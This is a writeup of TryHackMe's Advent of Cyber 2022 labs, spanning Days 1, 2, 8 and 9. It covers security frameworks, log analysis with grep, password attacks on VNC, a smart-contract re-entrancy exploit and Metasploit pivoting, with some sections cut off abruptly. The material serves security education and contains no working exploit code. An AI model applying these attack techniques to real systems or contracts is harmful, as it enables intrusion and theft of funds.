---
Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas.
---

# Advent of Cyber 2022 — Writeup

## Overview
### Advent of Cyber 2022 — Writeup
![](https://assets.tryhackme.com/room-banners/aoc2022v3.png)
### [Day 1] Frameworks Someone's coming to town!
The Story
**John Hammond is kicking off the Advent of Cyber 2022 with a video premiere at 2pm BST! Once the video becomes available, you'll be able to see a sneak peek of the other tasks and a walkthrough of this day's challenge!**
Check out John Hammond's video walkthrough for day 1 [here](https://www.youtube.com/watch?v=G_2OcE8hxbA)!
### Best Festival Company Compromised
Someone is trying to stop Christmas this year and stop Santa from delivering gifts to children who were nice this year. The **Best Festival Company’s** website has been defaced, and children worldwide cannot send in their gift requests. There’s much work to be done to investigate the attack and test other systems! The attackers have left a puzzle for the Elves to solve and learn who their adversaries are. McSkidy looked at the puzzle and recognised some of the pieces as the phases of the **Unified Kill Chain**, a security framework used to understand attackers. She has reached out to you to assist them in recovering their website, identifying their attacker, and helping save Christmas.
### Security Frameworks
Organisations such as Santa’s Best Festival Company must adjust and improve their cybersecurity efforts to prevent data breaches. Security frameworks come into play to guide in setting up security programs and improve the security posture of the organisation.
**Security frameworks** are documented processes that define policies and procedures organisations should follow to establish and manage security controls. They are blueprints for identifying and managing the risks they may face and the weaknesses in place that may lead to an attack.
Frameworks help organisations remove the guesswork of securing their data and infrastructure by establishing processes and structures in a strategic plan. This will also help them achieve commercial and government regulatory requirements.
Let’s dive in and briefly look at the commonly used frameworks.
### NIST Cybersecurity Framework
The Cybersecurity Framework (CSF) was developed by the National Institute of Standards and Technology (NIST), and it provides detailed guidance for organisations to manage and reduce cybersecurity risk. The framework focuses on five essential functions: `**Identify**` -> `**Protect**` -> `**Detect**` -> `**Respond**` -> `**Recover.**` With these functions, the framework allows organisations to prioritise their cybersecurity investments and engage in continuous improvement towards a target cybersecurity profile.
### ISO 27000 Series
The International Organization of Standardization (ISO) develops a series of frameworks for different industries and sectors. The ISO 27001 and 27002 standards are commonly known for cybersecurity and outline the requirements and procedures for creating, implementing and managing an information security management system (ISMS). These standards can be used to assess an institution’s ability to meet set information security requirements through the application of risk management.
### MITRE ATT&CK Framework
Identifying adversary plans of attack can be challenging to embark on blindly. They can be understood through the behaviours, methods, tools and strategies established for an attack, commonly known as **T****actics**, **Techniques** and **Procedures** (TTPs). The MITRE ATT&CK framework is a knowledge base of TTPs, carefully curated and detailed to ensure security teams can identify attack patterns. The framework’s structure is similar to a periodic table, mapping techniques against phases of the attack chain and referencing system platforms exploited.
This framework highlights the detailed approach it provides when looking at an attack. It brings together environment-specific cybersecurity information to provide cyber threat intelligence insights that help teams develop effective security programs for their organisations. Dive further into the framework by checking out the dedicated [MITRE room](https://tryhackme.com/room/mitre).
### Cyber Kill Chain
A key concept of this framework was adopted from the military with the terminology **kill chain**, which describes the structure of an attack and consists of target identification, decision and order to attack the target, and finally, target destruction. Developed by Lockheed Martin, the cyber kill chain describes the stages commonly followed by cyber attacks and security defenders can use the framework as part of intelligence-driven defence.
There are seven stages outlined by the Cyber Kill Chain, enhancing visibility and understanding of an adversary’s tactics, techniques and procedures.
Dive further into the kill chain by checking out the dedicated [Cyber Kill Chain room](https://tryhackme.com/room/cyberkillchainzmt).
### Unified Kill Chain
As established in our scenario, Santa’s team have been left with a clue on who might have attacked them and pointed out to the Unified Kill Chain (UKC). The Elf Blue Team begin their research.
The Unified Kill Chain can be described as the unification of the MITRE ATT&CK and Cyber Kill Chain frameworks. Published by Paul Pols in 2017 (and reviewed in 2022), the UKC provides a model to defend against cyber attacks from the adversary’s perspective. The UKC offers security teams a blueprint for analysing and comparing threat intelligence concerning the adversarial mode of working.
The Unified Kill Chain describes 18 phases of attack based on Tactics, Techniques and Procedures (TTPs). The individual phases can be combined to form overarching goals, such as gaining an initial foothold in a targeted network, navigating through the network to expand access and performing actions on critical assets. Santa’s security team would need to understand how these phases are put together from the attacker’s perspective.
### CYCLE 1: In
The main focus of this series of phases is for an attacker to gain access to a system or networked environment. Typically, cyber-attacks are initiated by an external attacker. The critical steps they would follow are:
-   **Weaponisation**: Setting up the needed infrastructure to host the command and control centre (C2) is crucial in executing attacks.
-   **Delivery**: Payloads are malicious instruments delivered to the target through numerous means, such as email phishing and supply chain attacks.
-   **Social Engineering**: The attacker will trick their target into performing untrusted and unsafe action against the payload they just delivered, often making their message appear to come from a trusted in-house source.
-   **Exploitation**: If the attacker finds an existing vulnerability, a software or hardware weakness, in the network assets, they may use this to trigger their payload.
-   **Persistence**: The attacker will leave behind a fallback presence on the network or asset to make sure they have a point of access to their target.
-   **Defence Evasion**: The attacker must remain anonymous throughout their exploits by disabling and avoiding any security defence mechanisms enabled, including deleting evidence of their presence.
-   **Command & Control**: Remember the infrastructure that the attacker prepared? A communication channel between the compromised system and the attacker’s infrastructure is established across the internet.
This phase may be considered a loop as the attacker may be forced to change tactics or modify techniques if one fails to provide an entrance into the network.
### CYCLE 2: Through
Under this phase, attackers will be interested in gaining more access and privileges to assets within the network.
The attacker may repeat this phase until the desired access is obtained.
**Pivoting**: Remember the system that the attacker may use for persistence? This system will become the attack launchpad for other systems in the network.
**
-   **Discovery**: The attacker will seek to gather as much information about the compromised system, such as available users and data. Alternatively, they may remotely discover vulnerabilities and assets within the network. This opens the way for the next phase.
-   **Privilege Escalation**: Restricted access prevents the attacker from executing their mission. Therefore, they will seek higher privileges on the compromised systems by exploiting identified vulnerabilities or misconfigurations.
-   **Execution**: With elevated privileges, malicious code may be downloaded and executed to extract sensitive information or cause further havoc on the system.
-   **Credential Access**: Part of the extracted sensitive information would include login credentials stored in the hard disk or memory. This provides the attacker with more firepower for their attacks.
-   **Lateral Movement**: Using the extracted credentials, the attacker may move around different systems or data storages within the network, for example, within a single department.
**NOTE**: A key element that one may think is missing is Access. This is not formally covered as a phase of the UKC, as it overlaps with other phases across the different levels, leading to the adversary achieving their goals for an attack.
### CYCLE 3: Out
The Confidentiality, Integrity and Availability (CIA) of assets or services are compromised during this phase. Money, fame or sabotage will drive attackers to undertake their reasons for executing their attacks, cause as much damage as possible and disappear without being detected.
-   **Exfiltration**: The attacker must get his loot out of the network. Various techniques may be used to ensure they have achieved their objectives without triggering suspicion.
-   **Impact**: When compromising the availability or integrity of an asset or information, the attacker will use all the acquired privileges to manipulate, interrupt and sabotage. Imagine the reputation, financial and social damage an organisation would have to recover from.
-   **Objectives**: Attackers may have other goals to achieve that may affect the social or technical landscape that their targets operate within. Defining and understanding these objectives tends to help security teams familiarise themselves with adversarial attack tools and conduct risk assessments to defend their assets.
### Saving The Best Festival Company
Having gone through the UKC with Santa’s security team, it is evident that better defensive strategies must be implemented to raise resilience against attacks.
Your task is to help the Elves solve a puzzle left for them to identify who is trying to stop Christmas. Click the **View Site** button at the top of the task to launch the static site in split view. You may have to open the static site on a new window and zoom in for a clearer view of the puzzle pieces.
Answer the questions below
Who is the adversary that attacked Santa's network this year?
![[Pasted image 20221217230257.png]]
![[Pasted image 20221217230432.png]]
![[Pasted image 20221217230444.png]]
![[Pasted image 20221217230456.png]]
![[Pasted image 20221217230609.png]]
![[Pasted image 20221217230619.png]]
![[Pasted image 20221217230630.png]]
![[Pasted image 20221217230752.png]]
![[Pasted image 20221217230803.png]]
![[Pasted image 20221217230813.png]]
*The Bandit Yeti!*
What's the flag that they left behind?
Looking to learn more? Check out the rooms on [Unified Kill Chain](https://tryhackme.com/room/unifiedkillchain), [Cyber Kill Chain](https://tryhackme.com/room/cyberkillchainzmt), [MITRE](https://tryhackme.com/room/mitre), or the whole [Cyber Defence Frameworks](https://tryhackme.com/module/cyber-defence-frameworks) module!
### [Day 2] Log Analysis Santa's Naughty & Nice Log
The Story
Check out CMNatic's video walkthrough for Day 2 [here](https://www.youtube.com/watch?v=OXBJu5QKJmw)!
Santa’s Security Operations Center (SSOC) has noticed one of their web servers, [santagift.shop](http://santagift.shop/) has been hijacked by the Bandit Yeti APT group. Elf McBlue’s task is to analyse the log files captured from the web server to understand what is happening and track down the Bandit Yeti APT group.
Learning Objectives
In today’s task, you will:
-   Learn what log files are and why they’re useful
-   Understand what valuable information log files can contain
-   Understand some common locations these logs file can be found
-   Use some basic Linux commands to start analysing log files for valuable information
-   Help Elf McBlue track down the Bandit Yeti APT!
What Are Log Files and Why Are They Useful
Log files are files that contain historical records of events and other data from an application. Some common examples of events that you may find in a log file:
-   Login attempts or failures
-   Traffic on a network
-   Things (website URLs, files, etc.) that have been accessed
-   Password changes
-   Application errors (used in debugging)
-   _and many, many more_
By making a historical record of events that have happened, log files are extremely important pieces of evidence when investigating:
-   What has happened?
-   When has it happened?
-   Where has it happened?
-   Who did it? Were they successful?
-   What is the result of this action?
For example, a systems administrator may want to log the traffic happening on a network. We can use logging to answer the questions above in a given scenario:
_A user has reportedly accessed inappropriate material on a University network._ With logging in place, a systems administrator could determine the following:
Question
Answer
What has happened?
A user is confirmed to have accessed inappropriate material on the University network.
When has it happened?
It happened at 12:08 on Tuesday, 01/10/2022.
Where has it happened?
It happened from a device with an IP address (an identifier on the network) of 10.3.24.51.
Who did it? Were they successful?
The user was logged into the university network with their student account.
What is the result of the action?
The user was able to access _inappropriatecontent.thm_.
Log files come in all shapes and sizes. However, a useful log will contain at least some of the following attributes:
1.  A timestamp of the event (I.e. Date & Time)
2.  The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
3.  The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).
Common Locations of Log Files
Windows
﻿Windows features an in-built application that allows us to access historical records of events that happen. The Event Viewer is illustrated in the picture below:
These events are usually categorised into the following:
Category
Description
Example
Application
This category contains all the events related to applications on the system. For example, you can determine when services or applications are stopped and started and why.
The service "tryhackme.exe" was restarted.
Security
This category contains all of the events related to the system's security. For example, you can see when a user logs in to a system or accesses the credential manager for passwords.
User "cmnatic" successfully logged in.
Setup
This category contains all of the events related to the system's maintenance. For example, Windows update logs are stored here.
The system must be restarted before "KB10134" can be installed.
System
This category contains all the events related to the system itself. This category of events contains logs that relate to changes in the system itself. For example, when the system is powered on or off or when devices such as USB drives are plugged-in or removed.
The system unexpectedly shutdown due to power issues.
Linux (Ubuntu/Debian)
﻿On this flavour of Linux, operating system log files (and often software-specific such as apache2) are located within the `/var/log` directory. We can use the `ls` in the `/var/log` directory to list all the log files located on the system:
Listing log files within the /var/log directory
```shell-session
cmnatic@aoc2022-day-2:/var/log$ ls -lah
total 724K
drwxrwxr-x   9 root      syslog          4.0K Nov 14 10:59 .
drwxr-xr-x  13 root      root            4.0K Oct 26  2020 ..
drwxr--r-x   3 root      root            4.0K Nov 14 10:56 amazon
drwxr-xr-x   2 root      root            4.0K Oct 26  2020 apt
-rw-r-----   1 syslog    adm              11K Nov 14 11:03 auth.log
-rw-rw----   1 root      utmp               0 Oct 26  2020 btmp
-rw-r--r--   1 root      root            7.3K Nov 14 10:59 cloud-init-output.log
-rw-r--r--   1 syslog    adm             251K Nov 14 10:59 cloud-init.log
drwxr-xr-x   2 root      root            4.0K Oct  7  2020 dist-upgrade
-rw-r--r--   1 root      adm              36K Nov 14 10:59 dmesg
-rw-r--r--   1 root      adm              36K Nov 14 10:56 dmesg.0
-rw-r--r--   1 root      root             12K Oct 26  2020 dpkg.log
drwxr-sr-x+  3 root      systemd-journal 4.0K Nov 14 10:55 journal
-rw-r-----   1 syslog    adm              98K Nov 14 10:59 kern.log
drwxr-xr-x   2 landscape landscape       4.0K Nov 14 10:57 landscape
-rw-rw-r--   1 root      utmp            286K Nov 14 11:03 lastlog
drwx------   2 root      root            4.0K Nov 14 10:55 private
-rw-r-----   1 syslog    adm             207K Nov 14 11:03 syslog
drwxr-x---   2 root      adm             4.0K Nov 14 10:55 unattended-upgrades
-rw-rw-r--   1 root      utmp            8.3K Nov 14 11:03 wtmp
```
The following table highlights some important log files:
Category
Description
File (Ubuntu)
Example
Authentication
This log file contains all authentication (log in). This is usually attempted either remotely or on the system itself (i.e., accessing another user after logging in).
auth.log
Failed password for root from 192.168.1.35 port 22 ssh2.
Package Management
This log file contains all events related to package management on the system. When installing a new software (a package), this is logged in this file. This is useful for debugging or reverting changes in case this installation causes unintended behaviour on the system.
dpkg.log
2022-06-03 21:45:59 installed neofetch.
Syslog
This log file contains all events related to things happening in the system's background. For example, crontabs executing, services starting and stopping, or other automatic behaviours such as log rotation. This file can help debug problems.
syslog
2022-06-03 13:33:7 Finished Daily apt download activities..
Kernel
This log file contains all events related to kernel events on the system. For example, changes to the kernel, or output from devices such as networking equipment or physical devices such as USB devices.
kern.log
2022-06-03 10:10:01 Firewalling registered
Looking Through Log Files
Log files can quickly contain many events and hundreds, if not thousands, of entries. The difficulty in analysing log files is separating useful information from useless. Tools such as Splunk are software solutions known as Security Information and Event Management (SIEM) is dedicated to aggregating logs for analysis. Listed in the table below are some of the advantages and disadvantages of these platforms:
Advantage
Disadvantage
SIEM platforms are dedicated services for log analysis.
Commercial SIEM platforms are expensive to license and run.
SIEM platforms can collect a wide variety of logs - from devices to networking equipment.
SIEM platforms take considerable time to properly set up and configure.
SIEM platforms allow for advanced, in-depth analysis of many log files at once.
SIEM platforms require training to be properly used.
Luckily for us, most operating systems already come with a set of tools that allow us to search through log files. In this room, we will be using the `grep` command on Linux.
﻿_Grep_ is a command dedicated to searching for a given text in a file. _Grep_ takes a given input (a text or value) and searches the entire file for any text that matches our input.
Before using `grep`, we have to find the location of the log file that we want to search for. By default, `grep` will use your current working directory. You can find out what your current working directory is by using `pwd`. For example, in the terminal below, we are in the working directory _/home/cmnatic/aoc2022/day2/:_
Using pwd to view our current working directory
```shell-session
cmnatic@thm:~/aoc2022/day2 pwd
           /home/cmnatic/aoc2022/day2/
```
If we wish to change our current working directory, you can use `cd` followed by the new path you wish to change to. For example, `cd /my/path/here`. Once we've determined that we are in the correct directory, we can use `ls` to list the files and directories in our current working path. An example of this has been put into the terminal below:
Using ls to list the files and directories in our current directory
```shell-session
cmnatic@aoc2022-day-2:~$ ls -lah
webserver.log helloworld.txt mydirectory
```
Now that we know where our log files are, we can begin to proceed with learning how to use `grep`. To use grep, we need to do three things:
-   Call the command.
-   Specify any options that we wish to use (this will later be explained), but for now, we can ignore this.
-   Specify the location of the file we wish to search through (`grep` will first assume the file is in your current directory unless you tell it otherwise by providing the path to the file i.e. _/path/to/our/logfile.log_).
For example, in the terminal below, we are using `grep` to look through the log file for an IP address. The log file is located in our current working directory, so we do not need to provide a path to the log file - just the name of the log file.
Using grep to look in a log file for activity from an IP address
```shell-session
ubuntu@thm:~ grep "192.168.1.30" access.log
192.168.1.30 - - [14/Nov/2022:00:53:07 +0000] "GET / HTTP/1.1" 200 13742
192.168.1.30 - - [14/Nov/2022:00:53:43 +0000] "HEAD
```
In the terminal above, we can see two entries in this log file (access.log) for the IP address "192.168.1.30". For reference, we've narrowed down two entries from a log file with 469 entries. Our life has already been made easier! Here are some ideas for things you may want to use grep to search a log file for:
-   A name of a computer.
-   A name of a file.
-   A name of a user account.
-   An IP address.
-   A certain timestamp or date.
As previously mentioned, we can provide some options to `grep` to enable us to have more control over the results of grep. The table below contains some of the common options that you may wish to use with `grep`.
Option
Description
Example
-i
Perform a case insensitive search. For example, "helloworld" and "HELLOWORLD" will return the same results
`grep -i "helloworld" log.txt` and `grep -i "HELLOWORLD" log.txt` will return the same matches.
-E
Searches using regex (regular expressions). For example, we can search for lines that contain either "thm" or "tryhackme"
`grep -E "thm|tryhackme" log.txt`
-r
Search recursively. For example, search all of the files in a directory for this value.
`grep -r "helloworld" mydirectory`
Further options available in g_rep_ can be searched within _grep_'s manual page via `man grep`
Practical:
﻿For today's task, you will need to deploy the machine attached to this task by pressing the green "Start Machine" button located at the top-right of this task. The machine should launch in a split-screen view. If it does not, you will need to press the blue "Show Split Screen" button near the top-right of this page.
If you wish, you can use the following credentials to access the machine using SSH (remember to connect to the VPN first):
-   IP address: MACHINE_IP
-   Username: elfmcblue
-   Password: tryhackme!
Use the knowledge you have gained in today's task to help Elf McBlue track down the Bandit Yeti APT by answering the questions below.
Answer the questions below
Ensure you are connected to the deployable machine in this task.
Completed
Use the `ls` command to list the files present in the current directory. How many log files are present?
The directory needs to be /home/elfmcblue. You can use cd to change to this cd /home/elfmcblue
```text
┌──(kali㉿kali)-[~]
└─$ ssh elfmcblue@10.10.147.68                       
The authenticity of host '10.10.147.68 (10.10.147.68)' can't be established.
ED25519 key fingerprint is SHA256:i6xkyxunhDTQdiyxQ+AxOYJiFZgUw/XWHXyxxYBnmFI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.147.68' (ED25519) to the list of known hosts.
elfmcblue@10.10.147.68's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 18 04:12:52 UTC 2022

  System load:  0.41              Processes:             117
  Usage of /:   5.8% of 29.02GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for ens5: 10.10.147.68
  Swap usage:   0%

1 update can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

elfmcblue@day-2-log-analysis:~$ pwd
/home/elfmcblue
elfmcblue@day-2-log-analysis:~$ ls
SSHD.log  webserver.log
```
*2*
Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file?
You can use the ls command to list the files present in the directory.
*webserver.log*
Begin investigating the log file from question #3 to answer the following questions.
Completed
On what day was Santa's naughty and nice list stolen?
This answer is looking for a day in the week.
-   Learn about common remote access services.
-   Recognize a listening VNC port in a port scan.
-   Use a tool to find the VNC server’s password.
-   Connect to the VNC server using a VNC client.
### Remote Access Services
You can easily control your computer system using the attached keyboard and mouse when you are at your computer. How can we manage a computer system that is physically in a different place? The computer might be in a separate room, building, or country. The need for remote administration of computer systems led to the development of various software packages and protocols. We will mention three examples:
1.  SSH
2.  RDP
3.  VNC
**SSH** stands for **Secure Shell**. It was initially used in Unix-like systems for remote login. It provides the user with a command-line interface (CLI) that can be used to execute commands.
**RDP** stands for **Remote Desktop Protocol**; it is also known as Remote Desktop Connection (RDC) or simply Remote Desktop (RD). It provides a graphical user interface (GUI) to access an MS Windows system. When using Remote Desktop, the user can see their desktop and use the keyboard and mouse as if sitting at the computer.
**VNC** stands for **Virtual Network Computing**. It provides access to a graphical interface which allows the user to view the desktop and (optionally) control the mouse and keyboard. VNC is available for any system with a graphical interface, including MS Windows, Linux, and even macOS, Android and Raspberry Pi.
Based on our systems and needs, we can select one of these tools to control a remote computer; however, for security purposes, we need to think about how we can prove our identity to the remote server.
### Authentication
Authentication refers to the process where a system validates your identity. The process starts with the user claiming a specific unique identity, such as claiming to be the owner of a particular username. Furthermore, the user needs to prove their identity. This process is usually achieved by one, or more, of the following:
1.  **Something you know** refers, in general, to something you can memorize, such as a password or a PIN (Personal Identification Number).
2.  **Something you have** refers to something you own, hardware or software, such as a security token, a mobile phone, or a key file. The security token is a physical device that displays a number that changes periodically.
3.  **Something you are** refers to biometric authentication, such as when using a fingerprint reader or a retina scan.
Back to remote access services, we usually use passwords or private key files for authentication. Using a password is the default method for authentication and requires the least amount of steps to set up. Unfortunately, passwords are prone to a myriad of attacks.
### Attacking Passwords
Passwords are the most commonly used authentication methods. Unfortunately, they are exposed to a variety of attacks. Some attacks don’t require any technical skills, such as shoulder surfing or password guessing. Other attacks require the use of automated tools.
The following are some of the ways used in attacks against passwords:
1.  **Shoulder Surfing:** Looking over the victim’s shoulder might reveal the pattern they use to unlock their phone or the PIN code to use the ATM. This attack requires the least technical knowledge.
2.  **Password Guessing:** Without proper cyber security awareness, some users might be inclined to use personal details, such as birth date or daughter’s name, as these are easiest to remember. Guessing the password of such users requires some knowledge of the target’s personal details; their birth year might end up as their ATM PIN code.
3.  **Dictionary Attack:** This approach expands on password guessing and attempts to include all valid words in a dictionary or a word list.
4.  **Brute Force Attack:** This attack is the most exhaustive and time-consuming, where an attacker can try all possible character combinations.
Let’s focus on dictionary attacks. Over time, hackers have compiled one list after another of passwords leaked from data breaches. One example is RockYou’s list of breached passwords, which you can find on the AttackBox at `/usr/share/wordlists/rockyou.txt`. The choice of the word list should depend on your knowledge of the target. For instance, a French user might use a French word instead of an English one. Consequently, a French word list might be more promising.
RockYou’s word list contains more than 14 million unique passwords. Even if we want to try the top 5%, that’s still more than half a million. We need to find an automated way.
### Hacking an Authentication Service
To start the AttackBox and the attached Virtual Machine (VM), click on the “Start the AttackBox” button and click on the “Start Machine” button. Please give it a couple of minutes so that you can follow along.
On the AttackBox, we open a terminal and use Nmap to scan the target machine of IP address `MACHINE_IP`. The terminal window below shows that we have two listening services, SSH and VNC. Let’s see if we can discover the passwords used for these two services.
AttackBox Terminal
-   Explain what smart contracts are, how they relate to the blockchain, and why they are important.
-   Understand how contracts are related, what they are built upon, and standard core functions.
-   Understand and exploit a common smart contract vulnerability.
### What is a Blockchain?
One of the most recently innovated and discussed technologies is the blockchain and its impact on modern computing. While historically, it has been used as a financial technology, it's recently expanded into many other industries and applications. Informally, a blockchain acts as a database to store information in a specified format and is shared among members of a network with no one entity in control.
By definition, a blockchain is a digital database or ledger distributed among nodes of a peer-to-peer network. The blockchain is distributed among "peers" or members with no central servers, hence "decentralized." Due to its decentralized nature, each peer is expected to maintain the integrity of the blockchain. If one member of the network attempted to modify a blockchain maliciously, other members would compare it to their blockchain for integrity and determine if the whole network should express that change.
The core blockchain technology aims to be decentralized and maintain integrity; cryptography is employed to negotiate transactions and provide utility to the blockchain.
But what does this mean for security? If we ignore the core blockchain technology itself, which relies on cryptography, and instead focus on how data is transferred and negotiated, we may find the answer concerning. Throughout this task, we will continue to investigate the security of how information is communicated throughout the blockchain and observe real-world examples of practical applications of blockchain.
### Introduction to Smart Contracts
A majority of practical applications of blockchain rely on a technology known as a smart contract. Smart contracts are most commonly used as the backbone of DeFi applications (Decentralized Finance applications) to support a cryptocurrency on a blockchain. DeFi applications facilitate currency exchange between entities; a smart contract defines the details of the exchange. A smart contract is a program stored on a blockchain that runs when pre-determined conditions are met.
Smart contracts are very comparable to any other program created from a scripting language. Several languages, such as Solidity, Vyper, and Yul, have been developed to facilitate the creation of contracts. Smart contracts can even be developed using traditional programming languages such as Rust and JavaScript; at its core, smart contracts wait for conditions and execute actions, similar to traditional logic.
### Functionality of a Smart Contract
Building a smart contract may seem intimidating, but it greatly contrasts with core object-oriented programming concepts.
Before diving deeper into a contract's functionality, let's imagine a contract was a class. Depending on the fields or information stored in a class, you may want individual fields to be private, preventing access or modification unless conditions are met. A smart contract's fields or information should be private and only accessed or modified from functions defined in the contract. A contract commonly has several functions that act similarly to accessors and mutators, such as checking balance, depositing, and withdrawing currency.
Once a contract is deployed on a blockchain, another contract can then use its functions to call or execute the functions we just defined above.
If we controlled Contract A and Contract B wanted to first deposit 1 Ethereum, and then withdraw 1 Ethereum from Contract A,
Contract B calls the deposit function of Contract A.
Contract A authorizes the deposit after checking if any pre-determined conditions need to be met.
Contract B calls the withdraw function of Contract A.
Contract A authorizes the deposit if the pre-determined conditions for withdrawal are met.
Contract B can execute other functions after the Ether is sent from Contract A but before the function resolves.
### How do Vulnerabilities in Smart Contracts Occur?
Most smart contract vulnerabilities arise due to logic issues or poor exception handling. Most vulnerabilities arise in functions when conditions are insecurely implemented through the previously mentioned issues.
Let's take a step back to Contract A in the previous section. The conditions of the withdraw function are,
-   Balance is greater than zero
-   Send Etherium
At first glance, this may seem fine, but when is the amount to be sent subtracted from the balance? Referring back to the contract diagram, it is only ever deducted from the balance after the Etherium is sent. Is this an issue? The function should finish before the contract can process any other functions. But if you recall, a contract can consecutively make new calls to a function while an old function is still executing. An attacker can continuously attempt to call the withdraw function before it can clear the balance; this means that the pre-defined conditions will always be met. A developer must modify the function's logic to remove the balance before another call can be made or require stricter requirements to be met.
### The Re-entrancy Attack
In the above section, we informally introduced a common vulnerability known as re-entrancy. Reiterating what was covered above, re-entrancy occurs when a malicious contract uses a fallback function to continue depleting a contract's total balance due to flawed logic after an initial withdraw function occurs.
We have broken up the attack into diagrams similar to those previously seen to explain this better.
Assuming that contract B is the attacking contract and contract A is the storage contract. Contract B will execute a function to deposit, then withdraw at least one Ether. This process is required to initiate the withdraw function's response.
Note the difference between account balance and total balance in the above diagram. The storage contract separates balances per account and keeps each account's total balance combined. We are specifically targeting the total balance we do not own to exploit the contract.
At this point, contract B can either drop the response from the withdraw function or invoke a fallback function. A fallback function is a reserved function in Solidity that can appear once in a single contract. The function is executed when currency is sent with no other context or data, for example, what is happening in this example. The fallback function calls the withdraw function again, while the original call to the function was never fully resolved. Remember, the balance is never set back to zero, and the contract thinks of Ether as its total balance when sending it, not divided into each account, so it will continue to send currency beyond the account's balance until the total balance is zero.
Because the withdraw function sends Ether with no context or data, the fallback function will be called again, and thus an infinite loop can now occur.
Now that we have covered how this vulnerability occurs and how we can exploit it, let's put it to the test! We have provided you with the contract deployed by Best Festival Company in a safe and controlled environment that allows you to deploy contracts as if they were on a public blockchain.
### Practical Application
We have covered almost all of the background information needed to hit the ground running; let’s try our hand at actively exploiting a contract prone to a re-entrancy vulnerability. For this task, we will use [Remix IDE](https://remix.ethereum.org/), which offers a safe and controlled environment to test and deploy contracts as if they were on a public blockchain.
Download the zip folder attached to this task, and open Remix in your preferred browser.
We have provided you with two files, one gathered from the Best Festival Company used to host their cryptocurrency balance and another malicious contract that will attempt to exploit the re-entrancy vulnerability.
Both contracts are legitimate Solidity contracts, but no need to worry if you need help understanding the program syntax behind each. They follow the same functionality and methodology we covered throughout this task, just translated to code!
****Getting Familiar with the Remix Environment****
When you first open Remix, you want to draw your attention to the left side; there will be a file explorer, search, Solidity compiler, and deployment navigation button, respectively, from top to bottom. We will spend most of our time in the deploy & run transactions menu as it allows us to select from an environment, account, and contract and interact with contracts we have compiled.
****Importing the Necessary Contracts****
To get started with the task, you will need to import the task files provided to you. To do this, navigate to _file explorer → default_workspace → load a local file into the current workspace_. From here, you can select the necessary `.sol` files to be imported. We have provided you with an `EtherStore.sol` and `Attack.sol` file that functions as we introduced in this section.
****Compiling the Contracts****
The next step is to compile the contracts, navigate to the _s__olidity compiler_, and select `0.8.10+commitfcxxxxxx` from the dropdown _compiler_ menu. Now you can compile the contract by pressing the _compile_ button. You can ignore any _warnings_ you may receive when compiling.
****Deploying and Interacting with Contracts****
Now that we have the contracts compiled, they are ready to be deployed from the deployment tab. To the right is a screenshot of the deployment tab and labels that we will use to reference menu elements as we move throughout the deployment process.
First, we must select a contract for deployment from the _contract_ dropdown (_label 6_). We should deploy the EtherStore contract or target contract to begin. For deployment, you only need to press the _deploy_ button (_label 7)._
We can now interact with the contract underneath the _deployed contracts_ subsection. To test the contract, we can deposit Ether into the contract to be added to the total balance. To deposit, insert a value in the _value_ textbox (_label 4_) and select the currency denomination at the dropdown under _label 5._ Once setup is complete, you can deposit by pressing the deposit button (_label 10_).
Note: when pressing the deposit button, this is a public function we are calling just as if it were another contract calling the function externally.
We’ve now successfully deployed our first contract and used it! You should see the _Balance_ update (_label 9_).
Now that we have deployed our first contract, switch to a different account (dropdown _label 2_ and select a new account) and repeat the same process. This time you will be exploiting the original contract and should see the exploit actively occur! We have provided a summary of the steps to deploy and interact with a contract below.
Step 1: Select the contract you want to deploy from the _contract_ dropdown menu under _label 6_.
Step 2: Deploy the contract by pressing the deploy button.
Note: you need to provide a reference to the contract you are targeting before deploying the attack contract. To accomplish this, copy the address for _EtherStore_ from _label 11_ and paste the value in the textbox under _label 8_.
Step 3: Confirm the contract was deployed and the attack function can be seen from the _deployed contracts_ subsection.
Step 4: Execute and/or interact with the contract’s function; note that most functions require some form of value input to execute a function properly.
If you get stuck, re-read through the discovery and explanation of the re-entrancy vulnerability. Recall that it must first deposit and withdraw before the fallback function can occur.
Answer the questions below
If not already completed, download the zip folder attached to this task, and open Remix in your preferred browser.
Completed
What flag is found after attacking the provided EtherStore Contract?
![[Pasted image 20221218162542.png]]
![[Pasted image 20221218162609.png]]
![[Pasted image 20221218162649.png]]
![[Pasted image 20221218162735.png]]
![[Pasted image 20221218162751.png]]
![[Pasted image 20221218162908.png]]
![[Pasted image 20221218162922.png]]
![[Pasted image 20221218162949.png]]
![[Pasted image 20221218163015.png]]
![[Pasted image 20221218163203.png]]
![[Pasted image 20221218163222.png]]
![[Pasted image 20221218163059.png]]
![[Pasted image 20221218163252.png]]
![[Pasted image 20221218170706.png]]
trying with 5 or less eth deposit in order no to crash...
also withdrawing works!
Are you up for a little challenge to celebrate Day 8? Try your hand at these easy challenge rooms: [Quotient](https://tryhackme.com/room/quotient) and [Agent T](https://tryhackme.com/room/agentt)!
### [Day 9] Pivoting Dock the halls
The Story
Check out Alh4zr3d's video walkthrough for Day 9 [here](https://www.youtube.com/watch?v=mZqNP2fOLlk)!
**Today's task was created by the Metasploit Team at Rapid7.**
Because of the recent incident, Santa has asked his team to set up a new web application that runs on Docker. It's supposed to be much more secure than the previous one, but better safe than sorry, right? It's up to you, McSkidy, to show Santa that there may be hidden weaknesses before the bad guys find them!
-   Using Metasploit modules and Meterpreter to compromise systems
-   Network Pivoting
-   Post exploitation
### Concepts
### What is Docker?
